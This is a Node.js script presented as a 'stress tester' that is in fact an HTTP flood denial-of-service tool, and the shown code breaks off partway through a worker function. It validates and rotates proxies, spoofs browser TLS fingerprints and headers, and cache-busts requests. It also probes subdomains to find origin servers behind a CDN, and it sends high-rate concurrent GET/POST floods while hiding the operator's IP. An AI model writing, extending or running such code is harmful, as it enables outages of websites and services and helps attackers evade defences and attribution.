#!/usr/bin/env node

const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const https = require('https');
const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const readline = require('readline');
const fs = require('fs').promises;
const dns = require('dns').promises;
const crypto = require('crypto');
const { URL } = require('url');

// Disable TLS certificate validation globally to prevent "unable to verify leaf signature" errors
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const BANNER = `
+==============================================================+
|    ADVANCED STRESS TESTER V6.2 - M2 OPTIMIZED               |
|    Proxy Validation + RPS Control + CF Compatible           |
|    > 2 Concurrent/Thread    > RPS Limiter Feature           |
|    > 10000ms Proxy Timeout  > Auto Bad Proxy Skip           |
|    > JA3 Randomization      > 10-25K RPS with Proxies       |
+==============================================================+
`;

const BROWSER_PROFILES = [
    {
        name: 'Chrome 120 Windows',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        headers: {
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.130", "Google Chrome";v="120.0.6099.130"',
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
            ecdhCurve: 'X25519:P-256:P-384'
        },
        canvas: 'e3b0c44298fc1c149afbf4c8996fb924',
        webgl: 'ANGLE (Intel, Intel(R) UHD Graphics 620, OpenGL 4.1)'
    },
    {
        name: 'Firefox 121 Windows',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'TE': 'trailers'
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            sigalgs: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512',
            ecdhCurve: 'X25519:P-256:P-384:P-521'
        },
        canvas: '7f83b1657ff1fc53b92dc18148a1d65d',
        webgl: 'Mozilla'
    },
    {
        name: 'Chrome 119 Mac',
        ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        headers: {
            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"macOS"',
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            ecdhCurve: 'X25519:P-256:P-384'
        },
        canvas: 'a1b2c3d4e5f6789012345678901234ab',
        webgl: 'ANGLE (Apple, Apple M1, OpenGL 4.1)'
    },
    {
        name: 'Safari 17 Mac',
        ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            ecdhCurve: 'X25519:P-256:P-384:P-521'
        },
        canvas: '9f86d081884c7d659a2feaa0c55ad015',
        webgl: 'Apple GPU'
    },
    {
        name: 'Edge 120 Windows',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        headers: {
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        },
        tls: {
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            ecdhCurve: 'X25519:P-256:P-384'
        },
        canvas: 'b94d27b9934d3e08a52e52d7da7dabfa',
        webgl: 'ANGLE (NVIDIA, NVIDIA GeForce GTX 1660, OpenGL 4.5)'
    }
];

const config = {
    proxies: [],
    workingProxies: new Set(),
    proxyHealth: new Map(),
    debug: false,
    http2Sessions: new Map(),
    connectionPool: new Map(),
    dnsCache: new Map(),
    maxRPS: null,
    stats: {
        totalRequests: 0,
        successful: 0,
        failed: 0,
        bytesSent: 0,
        bytesReceived: 0,
        statusCodes: {},
        startTime: null,
        http2Requests: 0,
        connectionReuse: 0
    }
};

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function question(query) {
    return new Promise(resolve => rl.question(query, resolve));
}

function getRandomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function getAdvancedHeaders(url, profile = null) {
    if (!profile) profile = getRandomElement(BROWSER_PROFILES);
    
    const headers = {
        'User-Agent': profile.ua,
        'Accept': profile.headers['Accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': getRandomElement(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-US,en;q=0.5']),
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': getRandomElement(['document', 'empty']),
        'Sec-Fetch-Mode': getRandomElement(['navigate', 'cors', 'no-cors']),
        'Sec-Fetch-Site': getRandomElement(['none', 'same-origin', 'cross-site', 'same-site']),
        'Sec-Fetch-User': '?1',
        'Cache-Control': getRandomElement(['max-age=0', 'no-cache', 'no-store']),
        'Pragma': 'no-cache',
        ...profile.headers
    };
    
    if (profile.canvas) {
        headers['X-Canvas-Fingerprint'] = profile.canvas;
    }
    
    if (profile.webgl) {
        headers['X-WebGL-Vendor'] = profile.webgl;
    }
    
    if (Math.random() > 0.7) {
        headers['X-Requested-With'] = 'XMLHttpRequest';
    }
    
    if (Math.random() > 0.5) {
        headers['Referer'] = url;
    }
    
    if (profile.name.includes('Chrome') || profile.name.includes('Edge')) {
        headers['sec-ch-ua-arch'] = '"x86"';
        headers['sec-ch-ua-bitness'] = '"64"';
        headers['sec-ch-ua-model'] = '""';
    }
    
    return headers;
}

function addCacheBuster(url) {
    const separator = url.includes('?') ? '&' : '?';
    const params = [
        `_=${Date.now()}`,
        `rand=${Math.floor(Math.random() * 900000) + 100000}`,
        `nocache=${crypto.randomBytes(4).toString('hex')}`
    ];
    return url + separator + getRandomElement(params);
}

function createTLSAgent(profile, proxyUrl = null) {
    const cacheKey = `${proxyUrl || 'direct'}_${profile.name}`;
    
    if (config.connectionPool.has(cacheKey)) {
        const cached = config.connectionPool.get(cacheKey);
        if (Date.now() - cached.created < 120000) {
            config.stats.connectionReuse++;
            return cached.agent;
        }
        config.connectionPool.delete(cacheKey);
    }
    
    const tlsOptions = {
        rejectUnauthorized: false,
        ciphers: profile.tls.ciphers,
        minVersion: profile.tls.minVersion,
        maxVersion: profile.tls.maxVersion,
        ecdhCurve: profile.tls.ecdhCurve,
        honorCipherOrder: true,
        sessionTimeout: 300,
        keepAlive: true,
        keepAliveMsecs: 1000,
        maxSockets: 1024,
        maxFreeSockets: 512,
        timeout: 5000,
        scheduling: 'fifo'
    };
    
    if (profile.tls.sigalgs) {
        tlsOptions.sigalgs = profile.tls.sigalgs;
    }
    
    let agent;
    if (proxyUrl) {
        agent = proxyUrl.startsWith('https') 
            ? new HttpsProxyAgent(proxyUrl, tlsOptions)
            : new HttpProxyAgent(proxyUrl);
    } else {
        agent = new https.Agent(tlsOptions);
    }
    
    config.connectionPool.set(cacheKey, {
        agent,
        created: Date.now()
    });
    
    return agent;
}

async function createHTTP2Session(targetUrl, proxyUrl = null) {
    const cacheKey = `${targetUrl}_${proxyUrl || 'direct'}`;
    
    if (config.http2Sessions.has(cacheKey)) {
        const session = config.http2Sessions.get(cacheKey);
        if (!session.destroyed && !session.closed) {
            return session;
        }
        config.http2Sessions.delete(cacheKey);
    }
    
    return new Promise((resolve, reject) => {
        const url = new URL(targetUrl);
        const session = http2.connect(url.origin, {
            rejectUnauthorized: false,
            maxSessionMemory: 1000
        });
        
        session.on('error', (err) => {
            config.http2Sessions.delete(cacheKey);
            reject(err);
        });
        
        session.setTimeout(20000, () => {
            session.close();
            config.http2Sessions.delete(cacheKey);
        });
        
        config.http2Sessions.set(cacheKey, session);
        resolve(session);
    });
}

function addRealisticDelay() {
    return new Promise(resolve => {
        const delay = Math.floor(Math.random() * 50) + 10;
        setTimeout(resolve, delay);
    });
}

async function resolveViaDoH(domain) {
    if (config.dnsCache.has(domain)) {
        return config.dnsCache.get(domain);
    }
    
    try {
        const dohProviders = [
            'https://cloudflare-dns.com/dns-query',
            'https://dns.google/resolve',
            'https://dns.quad9.net/dns-query'
        ];
        
        const provider = getRandomElement(dohProviders);
        const response = await axios.get(provider, {
            params: { name: domain, type: 'A' },
            headers: { 'Accept': 'application/dns-json' },
            timeout: 3000
        });
        
        if (response.data && response.data.Answer) {
            const ip = response.data.Answer[0].data;
            config.dnsCache.set(domain, ip);
            return ip;
        }
    } catch (err) {
        // Fallback to system DNS
    }
    
    return domain;
}

function updateProxyHealth(proxyUrl, success, latency) {
    if (!config.proxyHealth.has(proxyUrl)) {
        config.proxyHealth.set(proxyUrl, {
            success: 0,
            fails: 0,
            totalLatency: 0,
            requests: 0,
            score: 100
        });
    }
    
    const health = config.proxyHealth.get(proxyUrl);
    health.requests++;
    
    if (success) {
        health.success++;
        health.totalLatency += latency;
    } else {
        health.fails++;
    }
    
    const successRate = health.success / health.requests;
    const avgLatency = health.totalLatency / health.success || 9999;
    health.score = (successRate * 70) + ((1000 - Math.min(avgLatency, 1000)) / 1000 * 30);
}

function getHealthyProxy() {
    if (config.proxies.length === 0) return null;
    
    const healthyProxies = config.proxies.filter(proxy => {
        const health = config.proxyHealth.get(proxy);
        return !health || health.score > 30;
    });
    
    if (healthyProxies.length === 0) {
        config.proxyHealth.clear();
        return getRandomElement(config.proxies);
    }
    
    healthyProxies.sort((a, b) => {
        const scoreA = config.proxyHealth.get(a)?.score || 100;
        const scoreB = config.proxyHealth.get(b)?.score || 100;
        return scoreB - scoreA;
    });
    
    const topTier = healthyProxies.slice(0, Math.ceil(healthyProxies.length * 0.3));
    return getRandomElement(topTier);
}

async function loadProxies(filePath = 'proxies.txt', targetUrl = null, validateProxies = false) {
    try {
        const data = await fs.readFile(filePath, 'utf-8');
        const raw = data.split('\n')
            .map(line => line.trim())
            .filter(line => line && !line.startsWith('#'));
        
        if (raw.length === 0) {
            console.log('[!] No proxies found in proxies.txt');
            console.log('[!] Format: ip:port (one per line)');
            return false;
        }
        
        console.log('\n' + '='.repeat(70));
        console.log(`[*] LOADING PROXIES`);
        console.log('='.repeat(70));
        
        const proxyList = raw.map(proxy => 
            proxy.startsWith('http') ? proxy : `http://${proxy}`
        );
        
        if (!validateProxies || !targetUrl) {
            config.proxies = proxyList;
            console.log(`[+] Loaded ${config.proxies.length} proxies (no validation)`);
            console.log(`[+] Proxies will be used in rotation during attack`);
            console.log('='.repeat(70) + '\n');
            return true;
        }
        
        console.log(`[*] Validating ${proxyList.length} proxies against target...`);
        console.log(`[*] Testing: ${targetUrl}`);
        console.log(`[*] Mode: PRECISION - 3-tier validation (dead check > speed test > reliability)`);
        console.log(`[*] Timeout: 800ms dead check | 1500ms speed test | 2000ms final`);
        console.log(`[*] Concurrency: 1500 simultaneous (MAXIMUM SPEED)`);
        console.log('='.repeat(70) + '\n');
        
        const startTime = Date.now();
        const chunkSize = 1500;
        let totalValid = 0;
        let totalTested = 0;
        const proxyMetrics = new Map(); // Store latency and status for sorting
        
        // Phase 1: Ultra-fast dead proxy elimination
        console.log('[PHASE 1] Eliminating dead proxies (800ms timeout)...');
        const phase1Start = Date.now();
        const aliveProxies = [];
        
        for (let i = 0; i < proxyList.length; i += chunkSize) {
            const chunk = proxyList.slice(i, i + chunkSize);
            
            const results = await Promise.all(
                chunk.map(async (proxy) => {
                    const testStart = Date.now();
                    try {
                        const agent = proxy.startsWith('https') 
                            ? new HttpsProxyAgent(proxy, { rejectUnauthorized: false, timeout: 800 })
                            : new HttpProxyAgent(proxy, { timeout: 800 });
                        
                        const response = await axios.get(targetUrl, {
                            httpAgent: agent,
                            httpsAgent: agent,
                            timeout: 800,
                            validateStatus: () => true,
                            maxRedirects: 2
                        });
                        
                        const latency = Date.now() - testStart;
                        return { proxy, alive: true, latency, status: response.status };
                    } catch (error) {
                        return { proxy, alive: false };
                    }
                })
            );
            
            results.forEach(result => {
                if (result.alive) {
                    aliveProxies.push(result.proxy);
                    proxyMetrics.set(result.proxy, { 
                        latency: result.latency, 
                        status: result.status,
                        score: 0 
                    });
                }
            });
            
            const progress = Math.min(i + chunkSize, proxyList.length);
            const speed = Math.floor(progress / (Date.now() - phase1Start) * 1000);
            process.stdout.write(`\r  [>] Progress: ${progress}/${proxyList.length} | Alive: ${aliveProxies.length} | Speed: ${speed}/s`);
        }
        
        const phase1Time = ((Date.now() - phase1Start) / 1000).toFixed(1);
        const eliminatedCount = proxyList.length - aliveProxies.length;
        const eliminatedPercent = ((eliminatedCount / proxyList.length) * 100).toFixed(1);
        
        console.log(`\n  [+] Eliminated ${eliminatedCount} dead proxies (${eliminatedPercent}%) in ${phase1Time}s\n`);
        
        if (aliveProxies.length === 0) {
            console.log('[!] NO ALIVE PROXIES FOUND!\n');
            return false;
        }
        
        // Phase 2: Speed and reliability test on alive proxies
        console.log(`[PHASE 2] Testing ${aliveProxies.length} alive proxies for speed & reliability...`);
        const phase2Start = Date.now();
        
        for (let i = 0; i < aliveProxies.length; i += chunkSize) {
            const chunk = aliveProxies.slice(i, i + chunkSize);
            const batchNum = Math.floor(i / chunkSize) + 1;
            const totalBatches = Math.ceil(aliveProxies.length / chunkSize);
            
            console.log(`[BATCH ${batchNum}/${totalBatches}] Testing ${chunk.length} proxies...`);
            
            const results = await Promise.all(
                chunk.map(async (proxy) => {
                    const testStart = Date.now();
                    try {
                        const agent = proxy.startsWith('https') 
                            ? new HttpsProxyAgent(proxy, { rejectUnauthorized: false, timeout: 1500 })
                            : new HttpProxyAgent(proxy, { timeout: 1500 });
                        
                        const response = await axios.get(targetUrl, {
                            httpAgent: agent,
                            httpsAgent: agent,
                            timeout: 1500,
                            validateStatus: () => true,
                            maxRedirects: 3
                        });
                        
                        const latency = Date.now() - testStart;
                        
                        // Calculate quality score (lower latency + good status = higher score)
                        let score = 100;
                        score -= (latency / 10); // Subtract 10 points per 100ms
                        if (response.status >= 200 && response.status < 300) score += 20;
                        else if (response.status >= 400 && response.status < 500) score -= 10;
                        else if (response.status >= 500) score -= 30;
                        
                        return { proxy, valid: true, latency, status: response.status, score: Math.max(0, score) };
                    } catch (error) {
                        return { proxy, valid: false, error: error.code };
                    }
                })
            );
            
            const batchValid = [];
            let fastCount = 0, mediumCount = 0, slowCount = 0;
            
            results.forEach(result => {
                if (result.valid) {
                    proxyMetrics.set(result.proxy, {
                        latency: result.latency,
                        status: result.status,
                        score: result.score
                    });
                    config.proxies.push(result.proxy);
                    batchValid.push(result.proxy.replace(/^https?:\/\//, ''));
                    totalValid++;
                    
                    // Categorize by speed
                    if (result.latency < 500) fastCount++;
                    else if (result.latency < 1000) mediumCount++;
                    else slowCount++;
                }
            });
            
            totalTested += chunk.length;
            const elapsed = ((Date.now() - phase2Start) / 1000).toFixed(1);
            const speed = Math.floor(totalTested / (Date.now() - phase2Start) * 1000);
            const remaining = aliveProxies.length - totalTested;
            const eta = remaining > 0 ? Math.ceil(remaining / speed) : 0;
            
            if (batchValid.length > 0) {
                console.log(`  [+] Validated ${batchValid.length} | Fast(<500ms): ${fastCount} | Medium: ${mediumCount} | Slow: ${slowCount}`);
            } else {
                console.log(`  [-] Validated 0 proxies in this batch`);
            }
            
            console.log(`  [i] Progress: ${totalTested}/${aliveProxies.length} | Speed: ${speed}/s | ETA: ${eta}s\n`);
        }
        
        // Sort proxies by quality score
        config.proxies.sort((a, b) => {
            const scoreA = proxyMetrics.get(a)?.score || 0;
            const scoreB = proxyMetrics.get(b)?.score || 0;
            return scoreB - scoreA;
        });
        
        const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
        const avgSpeed = Math.floor(proxyList.length / (Date.now() - startTime) * 1000);
        const finalRate = ((config.proxies.length / proxyList.length) * 100).toFixed(1);
        
        console.log('='.repeat(70));
        console.log('[+] VALIDATION COMPLETE - PROXIES SORTED BY QUALITY');
        console.log('='.repeat(70));
        console.log(`[+] Total Time: ${totalTime}s | Average Speed: ${avgSpeed} proxies/sec`);
        console.log(`[+] Result: ${config.proxies.length}/${proxyList.length} working (${finalRate}%)`);
        
        if (config.proxies.length > 0) {
            // Show top 5 best proxies with their metrics
            console.log(`\n[TOP 5 BEST PROXIES]`);
            const top5 = config.proxies.slice(0, 5);
            top5.forEach((proxy, idx) => {
                const metrics = proxyMetrics.get(proxy);
                const proxyIP = proxy.replace(/^https?:\/\//, '');
                const quality = metrics.score > 80 ? 'EXCELLENT' : metrics.score > 60 ? 'GOOD' : 'AVERAGE';
                console.log(`  ${idx + 1}. ${proxyIP} | ${metrics.latency}ms | Status ${metrics.status} | Score: ${metrics.score.toFixed(1)} (${quality})`);
            });
            
            // Speed distribution
            const fast = config.proxies.filter(p => proxyMetrics.get(p).latency < 500).length;
            const medium = config.proxies.filter(p => {
                const lat = proxyMetrics.get(p).latency;
                return lat >= 500 && lat < 1000;
            }).length;
            const slow = config.proxies.length - fast - medium;
            
            console.log(`\n[SPEED DISTRIBUTION]`);
            console.log(`  Fast (<500ms):   ${fast} proxies (${((fast / config.proxies.length) * 100).toFixed(1)}%)`);
            console.log(`  Medium (500-1s): ${medium} proxies (${((medium / config.proxies.length) * 100).toFixed(1)}%)`);
            console.log(`  Slow (>1s):      ${slow} proxies (${((slow / config.proxies.length) * 100).toFixed(1)}%)`);
        }
        console.log('='.repeat(70) + '\n');
        
        if (config.proxies.length === 0) {
            console.log('[!] NO WORKING PROXIES FOUND!');
            console.log('[!] All proxies failed to connect to target');
            console.log('[!] Try different proxies or continue without proxies\n');
            return false;
        }
        
        return true;
    } catch (err) {
        console.log('[!] proxies.txt not found!');
        console.log('[!] Create proxies.txt with format: ip:port (one per line)\n');
        return false;
    }
}

async function discoverOriginIPs(domain) {
    console.log(`[*] Discovering origin IPs for ${domain}...`);
    const foundIPs = new Set();
    
    const subdomains = [
        'direct', 'origin', 'direct-connect', 'direct-origin',
        'dev', 'staging', 'test', 'beta', 'alpha',
        'admin', 'panel', 'cpanel', 'webmail',
        'mail', 'smtp', 'ftp', 'api', 'api2'
    ];
    
    console.log(`[*] Scanning ${subdomains.length} subdomains...`);
    
    const cdnRanges = ['104.', '172.', '162.', '13.', '34.', '35.', '54.', '52.', '23.', '95.', '96.', '151.'];
    
    await Promise.all(subdomains.map(async sub => {
        try {
            const testDomain = `${sub}.${domain}`;
            const addresses = await dns.resolve4(testDomain);
            addresses.forEach(ip => {
                if (!cdnRanges.some(range => ip.startsWith(range))) {
                    foundIPs.add(ip);
                    console.log(`  [+] Found: ${testDomain} -> ${ip}`);
                }
            });
        } catch {}
    }));
    
    try {
        const mainIPs = await dns.resolve4(domain);
        mainIPs.forEach(ip => foundIPs.add(ip));
    } catch {}
    
    if (foundIPs.size > 0) {
        console.log(`[+] Discovered ${foundIPs.size} potential origin IPs`);
        return Array.from(foundIPs);
    } else {
        console.log('[!] No origin IPs found, using domain directly');
        return [domain];
    }
}

function updateStats(success, statusCode = null, bytesSent = 0, bytesReceived = 0) {
    config.stats.totalRequests++;
    if (success) {
        config.stats.successful++;
    } else {
        config.stats.failed++;
    }
    config.stats.bytesSent += bytesSent;
    config.stats.bytesReceived += bytesReceived;
    
    if (statusCode) {
        config.stats.statusCodes[statusCode] = (config.stats.statusCodes[statusCode] || 0) + 1;
    }
}

function displayStats() {
    const elapsed = (Date.now() - config.stats.startTime) / 1000;
    const reqRate = config.stats.totalRequests / elapsed;
    const successRate = config.stats.totalRequests > 0 
        ? (config.stats.successful / config.stats.totalRequests * 100).toFixed(1)
        : 0;
    const http2Percent = config.stats.totalRequests > 0
        ? ((config.stats.http2Requests / config.stats.totalRequests) * 100).toFixed(1)
        : 0;
    
    const memUsage = process.memoryUsage();
    const memMB = (memUsage.heapUsed / 1024 / 1024).toFixed(0);
    
    console.log('\n' + '='.repeat(70));
    console.log(`[STATS] Time: ${elapsed.toFixed(1)}s | Requests: ${config.stats.totalRequests.toLocaleString()} | Rate: ${reqRate.toFixed(0)} req/s`);
    console.log(`[STATS] Success: ${config.stats.successful.toLocaleString()} (${successRate}%) | Failed: ${config.stats.failed.toLocaleString()}`);
    console.log(`[STATS] HTTP/2: ${config.stats.http2Requests} (${http2Percent}%) | Conn Reuse: ${config.stats.connectionReuse}`);
    console.log(`[STATS] Memory: ${memMB}MB | Sent: ${(config.stats.bytesSent / 1024).toFixed(0)} KB | Received: ${(config.stats.bytesReceived / 1024).toFixed(0)} KB`);
    
    if (Object.keys(config.stats.statusCodes).length > 0) {
        const codes = Object.entries(config.stats.statusCodes)
            .sort(([a], [b]) => a - b)
            .map(([k, v]) => `${k}:${v}`)
            .join(', ');
        console.log(`[STATS] Status Codes: ${codes}`);
    }
    
    if (config.proxies.length > 0 && config.workingProxies.size > 0) {
        const workingIPs = Array.from(config.workingProxies).slice(0, 10).join(', ');
        const extra = config.workingProxies.size > 10 ? ` ... (+${config.workingProxies.size - 10} more)` : '';
        console.log(`[STATS] Working Proxies: ${config.workingProxies.size} | IPs: ${workingIPs}${extra}`);
    }
    
    console.log('='.repeat(70));
}

class HTTPFlood {
    constructor(url, duration, threads, method, useOrigin) {
        this.url = url;
        this.duration = duration;
        this.threads = threads;
        this.method = method;
        this.useOrigin = useOrigin;
        this.running = false;
        this.originIPs = [];
        this.domain = new URL(url).hostname;
    }
    
    async prepare() {
        console.log(`\n[*] Preparing ${this.method} flood attack...`);
        console.log(`[*] Target: ${this.url}`);
        console.log(`[*] Duration: ${this.duration}s`);
        console.log(`[*] Threads: ${this.threads}`);
        console.log(`[*] Mode: BURST (5 concurrent/thread, 0ms delay)`);
        console.log(`[*] JA3: Valid browser fingerprints + randomization`);
        console.log(`[*] Protocol: HTTP/1.1 (${config.proxies.length > 0 ? '10000' : '5000'}ms timeout)`);
        console.log(`[*] Connection: ${config.proxies.length > 0 ? '2048' : '1024'} socket pool + Keep-Alive`);
        console.log(`[*] IP Leak: DoH DNS + Proxy health monitoring`);
        if (config.proxies.length > 0) {
            console.log(`[*] Proxy: Simple rotation after 3 fails`);
            console.log(`[*] Proxy: 10 second timeout for slow proxies`);
            if (config.maxRPS) {
                console.log(`[*] RPS Limit: ${config.maxRPS.toLocaleString()} requests/second (controlled)`);
            }
        }
        
        const baseRPS = config.proxies.length > 0 ? 250 : 500;
        const estimatedRPS = Math.min(this.threads * baseRPS, config.maxRPS || (config.proxies.length > 0 ? 50000 : 100000));
        console.log(`[*] Estimated throughput: ${estimatedRPS.toLocaleString()}-${Math.min((estimatedRPS * 1.5), config.maxRPS || 999999).toLocaleString()} req/s`);
        
        if (this.threads > 100) {
            console.log(`[!] WARNING: ${this.threads} threads may overwhelm MacBook Air M2`);
            console.log(`[!] Recommended: 50-80 threads for optimal performance`);
        }
        
        if (this.useOrigin && this.domain) {
            this.originIPs = await discoverOriginIPs(this.domain);
        }
        
        if (config.proxies.length > 0) {
            console.log(`[*] Using ${config.proxies.length} proxies with rotation`);
            console.log(`[!] Enable debug mode to see errors (first 10 only)`);
            console.log(`[!] ECONNABORTED = proxy timeout, will auto-rotate`);
            
            if (this.threads > 150) {
                console.log(`[!] MacBook Air M2: Consider using 50-80 threads for stability`);
            }
            
            config.workingProxies.clear();
        } else {
            console.log('[!] WARNING: Direct connection - your IP is visible!');
        }
        
        config.stats.startTime = Date.now();
        this.running = true;
    }
    
    async worker(threadId) {
        let proxyIndex = threadId % Math.max(config.proxies.length, 1);
        let failCount = 0;
        let successCount = 0;
        let localCount = 0;
        let cachedAgent = null;
        let lastProxyIndex = -1;
        
        const profile = getRandomElement(BROWSER_PROFILES);
        const useProxy = config.proxies.length > 0;
        const isHttpsTarget = this.url.startsWith('https://');
        const concurrency = 5; // 5 concurrent requests per thread for bigger spike
        
        const endTime = Date.now() + this.duration * 1000;
        
        const makeRequest = async () => {
            const startTime = Date.now();
            
            try {
                const headers = getAdvancedHeaders(this.url, profile);
                
                // Add keep-alive for proxy compatibility
                if (useProxy) {
                    headers['Connection'] = 'keep-alive';
                }
                
                let targetUrl = this.url;
                
                if (this.originIPs.length > 0 && this.useOrigin) {
                    const originIP = getRandomElement(this.originIPs);
                    if (originIP !== this.domain) {
                        targetUrl = this.url.replace('https://', 'http://').replace(this.domain, originIP);
                        headers['Host'] = this.domain;
                    }
                }
                
                targetUrl = addCacheBuster(targetUrl);
                
                // Reuse agent per thread for better connection handling
                if (useProxy) {
                    if (proxyIndex !== lastProxyIndex || !cachedAgent) {
                        const proxy = config.proxies[proxyIndex];
                        // Choose agent based on target protocol, not proxy protocol
                        const agentOptions = {
                            rejectUnauthorized: false,
                            keepAlive: true,
                            keepAliveMsecs: 1000,
                            maxSockets: 2048,
                            maxFreeSockets: 1024,
                            timeout: 10000
                        };
                        
                        cachedAgent = isHttpsTarget
                            ? new HttpsProxyAgent(proxy, agentOptions)
                            : new HttpProxyAgent(proxy, agentOptions);
                        lastProxyIndex = proxyIndex;
                    }
                }
                
                const axiosConfig = {
                    method: this.method.toLowerCase(),
                    url: targetUrl,
                    headers,
                    timeout: useProxy ? 10000 : 5000,
                    maxRedirects: 3,
                    validateStatus: () => true,
                    decompress: true
                };
                
                if (useProxy && cachedAgent) {
                    // Set only the correct agent based on target protocol
                    if (isHttpsTarget) {
                        axiosConfig.httpsAgent = cachedAgent;
                    } else {
                        axiosConfig.httpAgent = cachedAgent;
                    }
                    axiosConfig.proxy = false;
                }
                
                if (this.method === 'POST') {
                    axiosConfig.data = 'data=' + 'x'.repeat(500);
                    axiosConfig.headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
                
                const response = await axios(axiosConfig);
                const latency = Date.now() - startTime;
                
                const bytesSent = 500;
                const bytesReceived = response.data ? String(response.data).length : 0;
                
                updateStats(true, response.status, bytesSent, bytesReceived);
                
                successCount++;
                failCount = 0;
                
                if (useProxy && successCount % 20 === 0) {
                    const proxyIP = config.proxies[proxyIndex].replace(/^https?:\/\//, '').split(':')[0];
                    config.workingProxies.add(proxyIP);
                }
                
                if (config.debug && localCount === 0) {
                    console.log(`[DEBUG] T${threadId}: SUCCESS - Status: ${response.status} - Latency: ${latency}ms - Proxy: ${useProxy ? 'YES' : 'NO'}`);
                }
                
                localCount++;
                
            } catch (error) {
                const latency = Date.now() - startTime;
                updateStats(false);
                
                failCount++;
                
                const errorCode = error.code || 'UNKNOWN';
                
                if (config.debug && failCount <= 3) {
